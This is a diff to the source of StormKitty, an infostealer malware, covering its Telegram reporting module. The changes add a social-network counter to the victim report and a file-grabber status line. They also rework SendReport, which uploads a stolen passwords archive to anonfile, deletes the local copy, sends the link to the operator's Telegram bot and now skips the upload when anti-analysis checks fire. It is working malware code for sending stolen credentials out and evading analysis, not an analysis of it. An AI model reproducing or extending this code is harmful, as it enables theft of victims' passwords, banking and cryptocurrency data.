@@ -182,6 +182,7 @@ namespace StormKitty.Telegram
                 + "\n  💸 *Domains info:*"
                 + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                 + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
+                + Counter.GetLValue("🎨 *Social networks*", Counter.DetectedSocialServices, '-')
                 + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                 + GetKeylogsHistory()
                 + "\n"
@@ -220,7 +221,7 @@ namespace StormKitty.Telegram
                 + Counter.GetBValue(Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1",
                 "✅ Keylogger installed", "⛔️ Keylogger not installed")
                 + "\n"
-                + "\n  📄 *File Grabber:*"
+                + "\n  📄 *File Grabber:*" + ((Config.GrabberModule != "1") ? "\n   ∟ ⛔️ Disabled in configuration" : "")
                 + Counter.GetIValue("📂 Images", Counter.GrabberImages)
                 + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                 + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
@@ -243,12 +244,12 @@ namespace StormKitty.Telegram
         /// <param name="file">Archive with passwords</param>
         public static void SendReport(string file)
         {
-            Console.WriteLine("Sending passwords archive to anonfile");
-            string url = AnonFile.Upload(file, GetLatestMessageId() == -1);
+            Logging.Log("Sending passwords archive to anonfile");
+            string url = AnonFile.Upload(file, GetLatestMessageId() == -1 && !AntiAnalysis.Run());
             File.Delete(file);
-            Console.WriteLine("Sending report to telegram");
+            Logging.Log("Sending report to telegram");
             SendSystemInfo(url);
-            Console.WriteLine("Report sent to telegram bot");
+            Logging.Log("Report sent to telegram bot");
         }
 
     }
